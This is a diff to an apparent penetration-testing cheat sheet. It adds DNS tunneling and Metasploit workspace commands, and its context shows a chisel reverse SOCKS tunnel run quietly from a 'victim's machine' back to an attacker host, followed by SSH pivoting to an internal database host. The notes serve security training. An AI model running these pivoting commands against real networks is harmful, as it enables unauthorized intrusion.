@@ -142,10 +142,26 @@ netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP di
 netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
 netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
 ```
-## Tunneling Through Deep Packet Inspection
+### Tunneling Through Deep Packet Inspection
 ```
 tail -f /var/log/apache2/access.log                                          \\\\ Verifying the logs of Apache2 server
 chisel server --port 8080 --reverse                                          \\\\ To run on the kali machine (server)
 /tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &             \\\\ To run on the victim's machine (client)
 ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
+```
+### DNS Tunneling
+```
+sudo tcpdump -i ens192 udp port 53
+```
+## The Metasploit Framework
+```
+sudo msfdb init
+sudo systemctl enable postgresql
+sudo msfconsole
+workspace                               \\\\ Displays the workspaces
+workspace -a <name>                     \\\\ Creates a new workspace
+db_nmap                                 \\\\ Nmap scan but the results are recorded into the database and can be interacted with next commands
+hosts
+services (-p for specific port)
+show -h    
 ```
